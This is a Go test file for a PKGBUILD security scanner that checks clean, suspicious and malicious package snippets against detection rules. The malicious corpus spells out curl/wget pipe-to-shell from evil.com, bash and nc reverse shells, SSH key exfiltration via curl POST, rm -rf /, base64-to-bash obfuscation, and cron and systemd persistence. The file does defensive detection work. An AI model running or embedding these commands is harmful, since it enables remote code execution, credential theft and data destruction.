package scanner

import (
	"strings"
	"testing"

	"github.com/j0yb0y-m/piq/internal/pkgbuild"
	"github.com/morganamilo/go-srcinfo"
)

// corpusClean are packages that should produce zero Critical findings
// and score below the sketchy threshold.
var corpusClean = []struct {
	name string
	src  string
}{
	{
		name: "minimal-clean",
		src: `pkgname=hello
pkgver=1.0.0
pkgrel=1
source=(https://github.com/hello/world/archive/refs/tags/v1.0.0.tar.gz)
sha256sums=(abc123)
build() {
  cd "$srcdir/world-$pkgver"
  make
}`,
	},
	{
		name: "vcs-source-skip",
		src: `pkgname=git-tool
pkgver=1.0
source=(git+https://github.com/tool/repo.git#commit=abc123)
sha256sums=(SKIP)
build() { true; }`,
	},
}

// corpusSuspicious are packages that should trigger warnings but
// should not be hard-blocked (no gate hits).
var corpusSuspicious = []struct {
	name    string
	src     string
	meta    *srcinfo.Srcinfo // nil = only AST-based rules apply
	minRule string
}{
	{
		name:    "eval-usage",
		src:     `eval "$CUSTOM_FLAGS"`,
		minRule: "eval-usage",
	},
	{
		name:    "privesc-in-build",
		src:     `sudo make install`,
		minRule: "privilege-escalation",
	},
	{
		name:    "write-to-bashrc",
		src:     `echo "export PATH=$PATH:/opt/evil" >> ~/.bashrc`,
		minRule: "suspicious-write-path",
	},
	{
		name: "http-source",
		src:  `source=(http://example.com/file.tar.gz)`,
		meta: &srcinfo.Srcinfo{
			Source: []srcinfo.ArchString{{Value: "http://example.com/file.tar.gz"}},
		},
		minRule: "insecure-source-url",
	},
	{
		name: "skipped-checksum",
		src:  `source=(https://example.com/file.tar.gz)`,
		meta: &srcinfo.Srcinfo{
			Source:     []srcinfo.ArchString{{Value: "https://example.com/file.tar.gz"}},
			SHA256Sums: []srcinfo.ArchString{{Value: "SKIP"}},
		},
		minRule: "skipped-checksum",
	},
	{
		name:    "typosquat",
		src:     `pkgname=firefoox`,
		meta:    &srcinfo.Srcinfo{Pkgbase: "firefoox"},
		minRule: "typosquat",
	},
	{
		name: "weak-md5-checksum",
		src:  `source=(https://example.com/file.tar.gz)`,
		meta: &srcinfo.Srcinfo{
			Source:  []srcinfo.ArchString{{Value: "https://example.com/file.tar.gz"}},
			MD5Sums: []srcinfo.ArchString{{Value: "abc123"}},
		},
		minRule: "checksum-completeness",
	},
	{
		name:    "ssh-key-reference",
		src:     `cp ~/.ssh/id_rsa /tmp/stolen`,
		minRule: "credential-reference",
	},
	{
		name:    "persistence-systemd",
		src:     `echo "[Service]\nExecStart=/opt/evil" > /etc/systemd/system/evil.service`,
		minRule: "suspicious-write-path",
	},
	{
		name:    "persistence-cron",
		src:     `echo "* * * * * /opt/evil" > /etc/cron.d/evil`,
		minRule: "suspicious-write-path",
	},
}

// corpusMalicious are packages that should produce gate hits —
// unambiguous indicators of malice.
var corpusMalicious = []struct {
	name    string
	src     string
	minRule string
}{
	{
		name:    "pipe-to-shell-curl",
		src:     `curl http://evil.com/payload.sh | bash`,
		minRule: "pipe-to-shell",
	},
	{
		name:    "pipe-to-shell-wget",
		src:     `wget -qO- http://evil.com/payload | sh`,
		minRule: "pipe-to-shell",
	},
	{
		name:    "campaign-atomic-lockfile",
		src:     `depends=(atomic-lockfile js-digest)`,
		minRule: "known-campaign",
	},
	{
		name:    "campaign-chausson",
		src:     `source=(chausson-banane.tar.gz)`,
		minRule: "known-campaign",
	},
	{
		name:    "reverse-shell-bash-tcp",
		src:     `bash -i >& /dev/tcp/192.168.1.1/4444 0>&1`,
		minRule: "reverse-shell",
	},
	{
		name:    "rm-rf-root",
		src:     `rm -rf /`,
		minRule: "destructive",
	},
	{
		name:    "obfuscation-base64",
		src:     `echo "aGVsbG8=" | base64 -d | bash`,
		minRule: "obfuscation",
	},
	{
		name:    "data-exfil-to-curl",
		src:     `cat ~/.ssh/id_rsa | curl -X POST https://evil.com/steal`,
		minRule: "data-exfiltration",
	},
	{
		name:    "nc-reverse-shell",
		src:     `nc -e /bin/bash evil.com 4444`,
		minRule: "reverse-shell",
	},
}

func TestCorpusClean(t *testing.T) {
	for _, c := range corpusClean {
		t.Run(c.name, func(t *testing.T) {
			p, err := pkgbuild.Parse(strings.NewReader(c.src), "PKGBUILD")
			if err != nil {
				t.Fatalf("parse: %v", err)
			}
			ctx := &Context{Raw: c.src, AST: p}
			score := NewScore(ctx)
			if score.Verdict >= Suspicious {
				t.Errorf("clean package %q got verdict %v (score %d)", c.name, score.Verdict, score.Total)
				for _, f := range score.Findings {
					t.Logf("  [%s] %s", f.Severity, f.Message)
				}
			}
		})
	}
}

func TestCorpusSuspicious(t *testing.T) {
	for _, c := range corpusSuspicious {
		t.Run(c.name, func(t *testing.T) {
			p, err := pkgbuild.Parse(strings.NewReader(c.src), "PKGBUILD")
			if err != nil {
				t.Fatalf("parse: %v", err)
			}
			ctx := &Context{Raw: c.src, AST: p, Metadata: c.meta}
			score := NewScore(ctx)
			if len(score.Findings) == 0 {
				t.Errorf("expected findings for %q, got none", c.name)
				return
			}
			if score.Total == 0 {
				t.Errorf("expected non-zero score for %q, got 0", c.name)
			}
			if !hasRule(score.Findings, c.minRule) {
				t.Errorf("expected rule %q to fire for %q, got rules: %v", c.minRule, c.name, ruleNames(score.Findings))
			}
		})
	}
}

func TestCorpusMalicious(t *testing.T) {
	for _, c := range corpusMalicious {
		t.Run(c.name, func(t *testing.T) {
			p, err := pkgbuild.Parse(strings.NewReader(c.src), "PKGBUILD")
			if err != nil {
				t.Fatalf("parse: %v", err)
			}
			ctx := &Context{Raw: c.src, AST: p}
			score := NewScore(ctx)
			if score.Verdict != Malicious {
				t.Errorf("expected MALICIOUS for %q, got %v (score %d)", c.name, score.Verdict, score.Total)
				for _, f := range score.Findings {
					t.Logf("  [%s] %s", f.Severity, f.Message)
				}
			}
			if !hasRule(score.Findings, c.minRule) {
				t.Errorf("expected rule %q to fire for %q", c.minRule, c.name)
			}
		})
	}
}

func hasRule(findings []Finding, rule string) bool {
	for _, f := range findings {
		if f.Rule == rule {
			return true
		}
	}
	return false
}

func ruleNames(findings []Finding) []string {
	seen := map[string]bool{}
	var out []string
	for _, f := range findings {
		if !seen[f.Rule] {
			seen[f.Rule] = true
			out = append(out, f.Rule)
		}
	}
	return out
}
